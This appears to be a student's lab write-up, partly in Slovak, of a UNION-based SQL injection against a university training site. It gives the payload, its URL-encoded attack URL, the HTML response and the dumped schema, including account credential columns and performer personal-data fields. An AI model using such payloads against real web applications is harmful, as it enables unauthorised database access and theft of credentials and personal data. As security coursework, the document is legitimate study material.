Select:
```mysql
SELECT JSON_ARRAYAGG(CONCAT_WS(',',
COALESCE(TABLE_NAME,''),COALESCE(COLUMN_NAME,''),COALESCE(ORDINAL_POSITION,''),COALESCE(COLUMN_DEFAULT,''),COALESCE(IS_NULLABLE,''),COALESCE(DATA_TYPE,''),COALESCE(COLUMN_TYPE,''),COALESCE(PRIVILEGES,'')
)),NULL,NULL,NULL FROM INFORMATION_SCHEMA.COLUMNS
WHERE COLUMNS.TABLE_SCHEMA='bek'
```

Payload:
```
' UNION
SELECT JSON_ARRAYAGG(CONCAT_WS(',',
COALESCE(TABLE_NAME,''),COALESCE(COLUMN_NAME,''),COALESCE(ORDINAL_POSITION,''),COALESCE(COLUMN_DEFAULT,''),COALESCE(IS_NULLABLE,''),COALESCE(DATA_TYPE,''),COALESCE(COLUMN_TYPE,''),COALESCE(PRIVILEGES,'')
)),NULL,NULL,NULL FROM INFORMATION_SCHEMA.COLUMNS
WHERE COLUMNS.TABLE_SCHEMA='bek'
AND '1'='1
```

Encoded:
```
%27%20UNION%0ASELECT%20JSON_ARRAYAGG%28CONCAT_WS%28%27%2C%27%2C%0ACOALESCE%28TABLE_NAME%2C%27%27%29%2CCOALESCE%28COLUMN_NAME%2C%27%27%29%2CCOALESCE%28ORDINAL_POSITION%2C%27%27%29%2CCOALESCE%28COLUMN_DEFAULT%2C%27%27%29%2CCOALESCE%28IS_NULLABLE%2C%27%27%29%2CCOALESCE%28DATA_TYPE%2C%27%27%29%2CCOALESCE%28COLUMN_TYPE%2C%27%27%29%2CCOALESCE%28PRIVILEGES%2C%27%27%29%0A%29%29%2CNULL%2CNULL%2CNULL%20FROM%20INFORMATION_SCHEMA.COLUMNS%0AWHERE%20COLUMNS.TABLE_SCHEMA%3D%27bek%27%0AAND%20%271%27%3D%271
```

Whole URL:
```
http://boura.fit.cvut.cz/nightclub/bookgirl.php?girl=%27%20UNION%0ASELECT%20JSON_ARRAYAGG%28CONCAT_WS%28%27%2C%27%2C%0ACOALESCE%28TABLE_NAME%2C%27%27%29%2CCOALESCE%28COLUMN_NAME%2C%27%27%29%2CCOALESCE%28ORDINAL_POSITION%2C%27%27%29%2CCOALESCE%28COLUMN_DEFAULT%2C%27%27%29%2CCOALESCE%28IS_NULLABLE%2C%27%27%29%2CCOALESCE%28DATA_TYPE%2C%27%27%29%2CCOALESCE%28COLUMN_TYPE%2C%27%27%29%2CCOALESCE%28PRIVILEGES%2C%27%27%29%0A%29%29%2CNULL%2CNULL%2CNULL%20FROM%20INFORMATION_SCHEMA.COLUMNS%0AWHERE%20COLUMNS.TABLE_SCHEMA%3D%27bek%27%0AAND%20%271%27%3D%271
```

Answer:
```html
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
	<title>Night club template</title>
	<link rel="stylesheet" href="style.css" type="text/css" charset="utf-8" />
</head>

<body>
<div id="container">
	<div id="menu">

		<ul>
			<li id="m01"><a href="index.php">Home</a></li>
			<li id="m02"><a href="index-2.php">Photos</a></li>
			<li id="m03"><a href="index-3.php">Parties</a></li>
			<li id="m04"><a href="index-4.php">Booking</a></li>
			<li id="m05"><a href="index-5.php">Login</a></li>
		</ul>

	</div>
	<div id="header">
		<div id="dj">
		<div id="welcome">
			<h2>Booking</h2>
<b>Girl #["accounts,id,1,,NO,int,int(10) unsigned,select", "accounts,usr,2,,NO,varchar,varchar(32),select", "accounts,pwd,3,,NO,varchar,varchar(40),select", "performers,id,1,,NO,int,int(11),select", "performers,nick,2,,NO,varchar,varchar(32),select", "performers,age,3,,NO,int,int(11),select", "performers,hair,4,,YES,varchar,varchar(32),select", "performers,name,5,,NO,varchar,varchar(128),select", "performers,street,6,,NO,varchar,varchar(128),select", "performers,city,7,,NO,varchar,varchar(128),select", "performers,zip,8,,NO,varchar,varchar(5),select", "performers,citizen_id,9,,NO,varchar,varchar(11),select", "stories,id,1,,NO,int,int(10) unsigned,select", "stories,title,2,,NO,varchar,varchar(128),select", "stories,text,3,,NO,varchar,varchar(4096),select", "stories,date_inserted,4,CURRENT_TIMESTAMP,NO,timestamp,timestamp,select", "stories,visible,5,,NO,int,int(11),select"]  is currently with a customer. Please try again later!</b>		</div>
		</div>
		<div class="clear"></div>
	</div>
	<div id="middle"></div>
	<div id="middle2"></div>
	<div id="footer">
		<p>Copyright � Website name all rights reserved. |  <a href="http://www.freewebsitetemplates.com/termsofuse">Terms of use</a></p>
	</div>
</div>
</body>
</html>
```

Spracované data:

```
accounts,id,1,,NO,int,int(10) unsigned,select
accounts,usr,2,,NO,varchar,varchar(32),select
accounts,pwd,3,,NO,varchar,varchar(40),select

performers,id,1,,NO,int,int(11),select
performers,nick,2,,NO,varchar,varchar(32),select
performers,age,3,,NO,int,int(11),select
performers,hair,4,,YES,varchar,varchar(32),select
performers,name,5,,NO,varchar,varchar(128),select
performers,street,6,,NO,varchar,varchar(128),select
performers,city,7,,NO,varchar,varchar(128),select
performers,zip,8,,NO,varchar,varchar(5),select
performers,citizen_id,9,,NO,varchar,varchar(11),select

stories,id,1,,NO,int,int(10) unsigned,select
stories,title,2,,NO,varchar,varchar(128),select
stories,text,3,,NO,varchar,varchar(4096),select
stories,date_inserted,4,CURRENT_TIMESTAMP,NO,timestamp,timestamp,select
stories,visible,5,,NO,int,int(11),select
```

Vedeli by sme vytiahnúť viac dát o stĺpcoch ale ostatné `(COLUMN_KEY, DATETIME_PRECISION, ...)` mi neprišli podstatné.

Vidíme že na všetky tabulky máme len select právo čo je smutné.

Inak vidíme stĺpce pre jednotlíve tabulky:
- `accounts`: `id`,`usr`,`pwd`
- `performers`: `id`,`nick`,`age`,`hair`,`name`,`street`,`city`,`zip`,`citizen_id`
- `stories`: `id`,`title`,`text`,`date_inserted`,`visible`

